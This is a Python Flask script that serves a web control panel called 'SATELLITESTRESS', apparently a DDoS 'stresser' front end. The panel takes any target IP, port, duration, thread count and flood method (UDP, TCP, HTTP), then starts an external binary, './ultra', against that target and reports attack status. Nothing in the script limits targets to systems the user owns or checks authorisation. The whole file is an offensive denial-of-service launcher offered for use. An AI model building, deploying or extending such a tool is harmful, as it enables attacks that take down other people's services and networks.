#!/usr/bin/env python3
import os
import subprocess
import sys
import threading
import time

# ------------------------------------------------------------
# AUTO-INSTALL FLASK IF MISSING
# ------------------------------------------------------------
def install_flask():
    try:
        import flask
        print("[✓] Flask already installed.")
        return True
    except ImportError:
        print("[!] Flask not found. Installing now...")
        try:
            subprocess.check_call([sys.executable, "-m", "pip", "install", "flask"])
            print("[✓] Flask installed successfully.")
            return True
        except Exception as e:
            print(f"[✗] Failed to install Flask: {e}")
            return False

if not install_flask():
    print("Cannot proceed without Flask. Exiting.")
    sys.exit(1)

# Now import Flask
from flask import Flask, request, render_template_string, jsonify

# ------------------------------------------------------------
app = Flask(__name__)

ULTRA_BIN = "./ultra"

attack_status = {
    "running": False,
    "current_target": None,
    "start_time": None,
    "output": ""
}

def prepare_binary():
    if not os.path.exists(ULTRA_BIN):
        raise FileNotFoundError(f"Binary '{ULTRA_BIN}' not found.")
    os.chmod(ULTRA_BIN, 0o755)
    print(f"[✓] {ULTRA_BIN} ready.")

def run_attack_thread(ip, port, duration, threads, method="UDP-FREE"):
    global attack_status
    attack_status["running"] = True
    attack_status["current_target"] = f"{ip}:{port}"
    attack_status["start_time"] = time.time()
    attack_status["output"] = ""

    # Adjust this command based on your binary's syntax
    command = [ULTRA_BIN, "--target", ip, "--port", str(port), "--time", str(duration), "--threads", str(threads)]
    # Alternative: command = [ULTRA_BIN, ip, str(port), str(duration), str(threads)]

    try:
        proc = subprocess.Popen(
            command,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True
        )
        output_lines = []
        for line in iter(proc.stdout.readline, ''):
            if line:
                output_lines.append(line)
                print(f"[ULTRA] {line.strip()}")
        proc.wait()
        attack_status["output"] = "".join(output_lines)
    except Exception as e:
        attack_status["output"] = f"Error: {e}"
    finally:
        attack_status["running"] = False
        attack_status["start_time"] = None

@app.route('/', methods=['GET', 'POST'])
def index():
    if request.method == 'POST':
        ip = request.form.get('ip', '').strip()
        port = request.form.get('port', '').strip()
        duration = request.form.get('duration', '').strip()
        threads = request.form.get('threads', '1500').strip()
        method = request.form.get('method', 'UDP-FREE')
        
        if not ip or not port or not duration or not threads:
            return render_template_string(HTML_TEMPLATE, error="All fields required.")
        if not duration.isdigit() or not threads.isdigit():
            return render_template_string(HTML_TEMPLATE, error="Duration and threads must be numbers.")
        
        if not attack_status["running"]:
            thread = threading.Thread(
                target=run_attack_thread,
                args=(ip, port, int(duration), int(threads), method)
            )
            thread.daemon = True
            thread.start()
            message = f"Attack launched: {ip}:{port} for {duration}s with {threads} threads."
        else:
            message = "An attack is already running."
        
        return render_template_string(HTML_TEMPLATE, message=message, status=attack_status)
    
    return render_template_string(HTML_TEMPLATE, status=attack_status)

@app.route('/status')
def status():
    return jsonify({
        "running": attack_status["running"],
        "current_target": attack_status["current_target"],
        "start_time": attack_status["start_time"],
        "output": attack_status["output"][-500:]
    })

HTML_TEMPLATE = """
<!DOCTYPE html>
<html>
<head>
    <title>SATELLITESTRESS</title>
    <style>
        body {
            background: #0a0e1a;
            color: #00ffcc;
            font-family: 'Courier New', monospace;
            margin: 40px;
        }
        .container {
            max-width: 700px;
            margin: auto;
            background: #11151f;
            padding: 25px;
            border-radius: 12px;
            border: 1px solid #00ffcc44;
        }
        h1 { text-align: center; color: #00ffcc; text-shadow: 0 0 5px #00ffcc; }
        label { display: block; margin-top: 18px; font-weight: bold; color: #88ffdd; }
        input, select {
            width: 100%;
            padding: 10px;
            background: #1e2538;
            border: 1px solid #00ffcc66;
            color: #00ffcc;
            border-radius: 6px;
            font-family: monospace;
        }
        button {
            margin-top: 25px;
            background: #00ffcc;
            color: #0a0e1a;
            font-weight: bold;
            padding: 12px;
            width: 100%;
            border: none;
            border-radius: 8px;
            cursor: pointer;
        }
        button:hover { background: #00ddbb; box-shadow: 0 0 10px #00ffcc; }
        .status { margin-top: 30px; background: #0a0e1a; padding: 15px; border-radius: 8px; border-left: 4px solid #00ffcc; }
        .running { color: #ffaa44; }
        .completed { color: #44ffaa; }
        pre { background: #000000aa; padding: 10px; overflow-x: auto; }
        hr { border-color: #00ffcc33; }
    </style>
</head>
<body>
<div class="container">
    <h1>⚡ SATELLITESTRESS ⚡</h1>
    <form method="POST">
        <label>🎯 Target IP Address</label>
        <input type="text" name="ip" placeholder="34.0.0.218" required>
        
        <label>🔌 Port</label>
        <input type="number" name="port" placeholder="24984" required>
        
        <label>⏱️ Duration (seconds)</label>
        <input type="number" name="duration" placeholder="60" required>
        
        <label>🧵 Threads (default 1500)</label>
        <input type="number" name="threads" placeholder="1500" value="1500" required>
        
        <label>📡 Attack Method</label>
        <select name="method">
            <option value="UDP-FREE">UDP-FREE</option>
            <option value="TCP">TCP</option>
            <option value="HTTP">HTTP</option>
        </select>
        
        <button type="submit">🚀 LAUNCH ATTACK</button>
    </form>
    
    <div class="status">
        <h3>📊 Current Attack Status</h3>
        {% if status.running %}
            <p class="running">🔴 RUNNING against {{ status.current_target }}</p>
            <p>Started: {{ status.start_time }}</p>
        {% else %}
            <p class="completed">✅ IDLE - No attack running</p>
        {% endif %}
        {% if message %}<hr><p>{{ message }}</p>{% endif %}
        {% if status.output %}<hr><strong>Last Output:</strong><pre>{{ status.output[-1000:] }}</pre>{% endif %}
    </div>
</div>
</body>
</html>
"""

if __name__ == '__main__':
    prepare_binary()
    port = int(os.environ.get("PORT", 8080))
    print(f"[✓] Starting web server on port {port}")
    app.run(host='0.0.0.0', port=port, threaded=True)
